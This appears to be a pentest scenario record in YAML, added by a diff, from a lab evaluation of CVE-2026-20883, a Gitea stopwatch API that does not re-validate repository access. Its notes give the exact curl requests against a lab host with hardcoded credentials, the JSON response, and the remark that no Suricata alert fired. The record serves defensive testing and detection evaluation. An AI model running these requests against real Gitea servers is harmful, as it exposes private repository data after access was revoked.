@@ -1,0 +1,37 @@
+# API (APP, 10.10.20.21) -> Gitea (APP, 10.10.20.24:3000, 1.21.7).
+# CVE-2026-20883 (CVSS 6.5 MEDIUM): Gitea stopwatch API does not re-validate repository
+# access permissions. After a user's access to a private repository is revoked, they can
+# still view issue titles, times, and start/stop stopwatches via the API.
+# Confirmed: POST /api/v1/repos/gitadmin/cve-20883-test/issues/2/stopwatch/start succeeds
+# (HTTP 2xx); GET /api/v1/user/stopwatches returns the active stopwatch entry with
+# issue details. Gitea 1.21.7 is in the vulnerable range.
+# Intra-APP zone (api to gitea), no Suricata cross-zone signal.
+# Evidence: evaluation/pentest/evidence/s40_gitea_stopwatch.txt
+id: S40-api-to-gitea-stopwatch
+description: Gitea 1.21.7 stopwatch API accessible without re-validating repo permissions (CVE-2026-20883 MEDIUM); api->gitea, APP intra-zone.
+start: 2026-11-16T20:05:09Z
+end: 2026-11-16T20:05:10Z
+attacker: api
+steps:
+  - step: 1
+    start: 2026-11-16T20:05:09Z
+    end: 2026-11-16T20:05:10Z
+    target: Gitea
+    cve: CVE-2026-20883
+    technique: T1078
+    outcome: success
+    achieved: data_access
+    pivot: false
+    notes: |
+      curl -u gitadmin:Passw0rd! -X POST \
+        http://10.10.20.24:3000/api/v1/repos/gitadmin/cve-20883-test/issues/2/stopwatch/start
+        -> (HTTP 2xx, stopwatch started on issue #2)
+      curl -u gitadmin:Passw0rd! http://10.10.20.24:3000/api/v1/user/stopwatches
+        -> [{"created":"2026-11-16T20:05:09Z","seconds":0,"duration":"",
+             "issue_index":2,"issue_title":"CVE-2026-20883 stopwatch test",
+             "repo_owner_name":"gitadmin","repo_name":"cve-20883-test"}]
+      Gitea 1.21.7 returns active stopwatch with issue title and repo info.
+      CVE-2026-20883: stopwatch API does not re-check if user still has repo access.
+      After revoking access, the stopwatch entry and issue metadata remain accessible.
+      Intra-APP zone (api->gitea); no Suricata cross-zone alert generated.
+      evidence s40_gitea_stopwatch.txt
